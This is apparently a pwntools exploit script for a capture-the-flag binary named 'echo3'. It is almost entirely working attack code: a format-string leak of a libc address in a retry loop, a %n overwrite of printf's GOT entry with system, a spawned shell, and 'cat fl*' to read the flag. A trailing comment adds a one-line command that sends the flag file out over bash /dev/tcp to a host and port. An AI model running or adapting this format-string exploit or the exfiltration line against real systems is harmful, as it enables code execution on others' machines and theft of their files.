from pwn import *
import sys
import time
context.log_level = "debug"
# context.terminal = ["tmux", "splitw", "-h"]
# context.arch = "amd64"
def one_gadget(filename: str) -> list:
    return [
        int(i) for i in __import__('subprocess').check_output(
            ['one_gadget', '--raw', filename]).decode().split(' ')
    ]
# brva x = b *(pie+x)
# set follow-fork-mode 
# p/x $fs_base
# vis_heap_chunks
libc = None
for i in range(1000):
    if len(sys.argv) == 1:
        r = process("./echo3_patched")
        if args.GDB:
            gdb.attach(r,'b printf')
    elif len(sys.argv) == 3:
        r = remote(sys.argv[1], sys.argv[2])
    else:
        print("Usage: python3 {} [GDB | REMOTE_IP PORT]".format(sys.argv[0]))
        sys.exit(1)
    s       = lambda data               :r.send(data)
    sa      = lambda x, y               :r.sendafter(x, y)
    sl      = lambda data               :r.sendline(data)
    sla     = lambda x, y               :r.sendlineafter(x, y)
    ru      = lambda delims, drop=True  :r.recvuntil(delims, drop)
    uu32    = lambda data,num           :u32(r.recvuntil(data)[-num:].ljust(4,b'\x00'))
    uu64    = lambda data,num           :u64(r.recvuntil(data)[-num:].ljust(8,b'\x00'))
    leak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))
    l64     = lambda      :u64(r.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
    l32     = lambda      :u32(r.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))
    sl(b"%3046$p")
    try:
        leaked = ru("\n")
    except:
        leaked = "ooo"
    if leaked[-3::] == b'd60':
        libc = int(leaked,16) - 0x1b2d60
        leak("libc",hex(libc))
        break
    else:
        r.close()
        continue
system = libc + 0x3ad80
printf_got = 0x804a014  
sl(f"%{printf_got}c%14$noo%18$naaaa")
ru("aaaa")
now = 0
fmt = ""
fmt =f"%{system % 65536}c%4$hn"
now += system % 256
fmt += f"%{256 + (system // 65536 % 256) - now}c%3110$hhn"
# fmt+=f"%{(256 + 0x16 - now)}c%14$hhn"
# now += (256 + 0x16 - now)
# now %= 256
# # fmt+=f"%{256 + (printf_got + 2) // 65536 % 256 - now}c%4$hhn"
# # now += 256 + ((printf_got + 2) // 65536 % 256) - now
# leak("now",hex(now))
# # fmt +=f"%{(256 + (system // 65536 % 256) - now)%256}c%4$p"
# fmt += "%4$p%5$p%6$p"
fmt += "aaaa"
# fmt = f"%{system}c%4$naaaa"
print(fmt)
sl(fmt)
ru("aaaa")
sl("sh")
sl("cat fl*")
r.interactive()

'''
Writeup:
Try modify the variable so that we have infinite printf
'''


'''
cat /home/`whoami`/f*



In extreme condition maybe we can use
cat /home/$(whoami)/flag | bash -c 'exec 3<>/dev/tcp/0.0.0.0/12345; cat >&3' > /dev/null
'''